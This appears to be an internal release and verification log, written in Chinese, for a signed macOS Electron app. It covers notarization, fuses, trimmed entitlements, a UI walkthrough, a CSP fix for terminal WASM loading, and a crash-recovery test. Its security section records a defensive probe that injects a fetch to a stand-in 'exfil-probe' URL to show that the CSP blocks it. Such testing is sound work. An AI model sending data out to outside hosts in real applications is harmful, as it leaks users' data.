# S11 ship + 视觉走查取证(2026-07-04)

> 包:prod 签名+公证(Developer ID RQX6X6A635,notarization successful,app 贴票 validate 过,
> spctl accepted「Notarized Developer ID」);**fuses 已执行**(builder 日志 `executing @electron/fuses`);
> entitlements dump 实证仅剩 3 项(allow-jit / allow-unsigned-executable-memory / audio-input)——
> **dylib 注入组合三项确认移除**(C27)。安装 `/Applications/alpha-code.app`,CDP(9333)走查。
> 截图存 session scratchpad `visual-walkthrough/`(01-home/02-session/03-picker/04-hub/05-after-selfheal/06-terminal)。

## 逐屏结论

| 屏 | 结论 |
|---|---|
| 定制中心(01/04) | ✅ 全 reskin:tabs/已安装 6 条(含 cloud 连接器)/套件卡/连接器卡;登录态 PRO 保留(签名一致 → safeStorage 未失效,ADR-017 预期) |
| 会话屏(02) | ✅ timeline 全 reskin、**用户消息气泡正常(REQ-010 回归元素)**、markdown/代码块/问题卡、composer 全套 chips、审查面板正常 |
| 侧栏 | ✅ 品牌/项目树/账户卡全常态 |
| 终端(06,修复前) | ❌ **走查实抓 C24 断点**:ghostty WASM 经 `fetch("data:application/wasm;…")` 加载被 connect-src 拦 →「连接已丢失/Failed to fetch WASM: 404」(用户真机同步复现)→ **PR #64 修**(connect-src + `data:`,无外传面) |

## 安全取证(C24/C27)

- **exfil 拦截 ✓**:CDP 注入 `fetch("https://example.com/exfil-probe")` → `BLOCKED: TypeError: Failed to fetch`;控制台留精确违规日志(connect-src 指令全文)。CSP 经 header 注入(无 meta,双路径)。
- 回环 sidecar 链路正常(会话取数/SSE/导航全活;走查中的 `self-fail` 是探针用 port 1 触发 ERR_UNSAFE_PORT,探针缺陷非 CSP)。
- 签名链:spctl accepted + stapler validate(app)+ notarize 在新 fuses/紧 entitlements 下一次通过。
- 已知注记:dmg 本体未贴票(app 内贴票齐,Gatekeeper 在线校验通过;与 v0.1.0 行为一致)。

## B5 崩溃自愈实测 ✓

`kill -9` sidecar(NodeService utility)→ 新进程 respawn(pid 更替)→ renderer 恢复、
项目/会话/登录态完好(05-after-selfheal 截图)。验收①(10s 内自愈)通过。

## 修复迭代记录

- 走查 → 抓到终端 WASM 断点 → PR #64(connect-src data:)→ 重打包复验:见下行。
- **修后复验 ✓**(PR #64 包重装):WASM CSP 违规日志清零,「连接已丢失」toast 消失,会话屏干净(截图 06 更新)。残留 2 条 `Failed to update terminal` console error 与 CSP 无关(toggle 时序),终端面板全交互冒烟并入 REQ-016 真机批。

## verified 翻转依据(随本文档)
C24(双态走查 + exfil 取证 + 断点修复迭代闭环)· C27(fuses 执行 + entitlements dump 三删实证 + 公证一次过 + spctl/staple + 全屏走查)· B5(kill -9 respawn + 恢复截图)。C25/B11/B23 保持 shipped(open-path 白名单与错误态视觉未显式实测 → REQ-016)。
